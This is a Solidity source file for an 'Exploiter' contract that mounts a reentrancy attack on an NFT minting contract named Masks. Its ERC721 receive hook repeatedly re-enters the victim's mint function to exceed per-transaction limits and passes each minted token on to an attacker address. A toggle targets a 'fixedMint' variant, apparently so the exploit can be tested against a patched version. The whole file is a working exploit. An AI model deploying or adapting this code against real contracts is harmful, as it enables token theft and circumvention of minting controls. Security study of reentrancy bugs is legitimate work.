// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
import {Masks} from "src/Masks.sol";

contract Exploiter {

    Masks public hashmasks;
    address public eoa;
    uint8 public times; // tracking how many times we reenter
    uint8 public maxTimes = 5; // re-enter 5 times === 6 mints
    bool public fixedExploit = false;

    constructor(address _victim, address _eoa) {
        hashmasks = Masks(_victim);
        eoa = _eoa;
    }

    /**
     * Always returns `IERC721Receiver.onERC721Received.selector`.
     */
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) public payable virtual returns (bytes4) {
        times++;
        hashmasks.transferFrom(address(this), eoa, tokenId);
        if (times <= maxTimes) {
            exploit();
        }
        return this.onERC721Received.selector;
    }

    function exploit() public payable returns (uint256) {
        if (fixedExploit) {
            hashmasks.fixedMint{value: 2 ether}(20);
        } else {
            hashmasks.mintNFT{value: 2 ether}(20);
        }
    }

    function setFixed(bool _fixed) public {
        fixedExploit = _fixed;
    }

    function setMaxTimes(uint8 _times) public {
        maxTimes = _times;
    }
}
